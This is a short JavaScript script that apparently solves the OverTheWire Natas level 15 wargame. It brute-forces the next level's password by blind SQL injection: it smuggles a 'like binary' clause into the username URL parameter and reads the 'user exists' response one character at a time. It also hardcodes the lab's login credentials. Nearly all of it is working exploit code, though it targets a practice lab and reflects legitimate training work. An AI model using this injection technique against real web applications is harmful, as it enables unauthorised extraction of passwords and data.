//WARNING - Isn't the most efficient code

let password = "";
let count = 0;
let alphanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
let alphanumc = alphanum.length;
let passwordc = 32; //assuming password has 32 characters
let fl1=0;fl2=0;
while(count!=passwordc)
{
	fl1=fl2=0;
	console.log(count);
	console.log(password);
	//let oldp = (' '+password).slice(1);
	let oldp = password;
	for(let i=0;i<alphanumc;i++)
	{
		password += alphanum[i];
		//console.log(password);
		let xhr = new XMLHttpRequest();
		let url = `http://natas15.natas.labs.overthewire.org/index.php?debug=t&username=natas16%22+and+password+like+binary+%22${password}%`;
		xhr.open('GET',url,false,"natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J");
		
		xhr.onload = function() {
		  if (xhr.status != 200) { // analyze HTTP status of the response
		    alert(`Error ${xhr.status}: ${xhr.statusText}`); // e.g. 404: Not Found
		  } else { // show the result
		  		
		  	//let substr = (xhr.response).match(/(?<=<body>\s+).*?(?=\s+<\/body>)/gs);
		  	let substr = xhr.response.match("<br>(.*)<br>");
		  	if(!substr[1].localeCompare("This user exists."))
		  	{
		  		console.log("USER EXISTS");
		  		count++;
		  		fl1=1;
		  	}
		  	else
		  	{
		  		console.log("USER DOES NOT EXIST");
		  		//password = (' '+oldp).slice(1);
		  		password = oldp;
		  		//console.log("reverting to old");
		  		//console.log(password);
		  		fl2=1;
		  	  }
		  	}
		};
			xhr.onerror = function() {
		  alert("Request failed");
		};
			xhr.send();
			if(fl1==1) break;
			if(fl2==1) continue;
	}
}
console.log(password);	
